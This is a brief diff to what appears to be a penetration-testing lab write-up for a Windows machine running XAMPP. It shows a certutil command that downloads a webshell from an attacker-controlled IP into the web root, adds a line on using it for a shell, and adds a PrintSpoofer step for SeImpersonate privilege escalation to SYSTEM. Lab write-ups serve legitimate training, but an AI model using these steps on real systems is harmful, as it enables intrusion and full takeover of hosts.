@@ -71,8 +71,12 @@ C:\xampp\htdocs CRAFT\apache:(OI)(CI)(F)
 </html>
 
 PS C:\xampp\htdocs\assets> certutil -urlcache -split -f http://192.168.49.249:8000/webshell.php
+Use your webshell to get a shell on the box.
 ```
-## SeImpersonate to NT Authority
+## Privesc SeImpersonate to NT Authority
+```
+PrintSpoofer64.exe 
+```
 
 
 
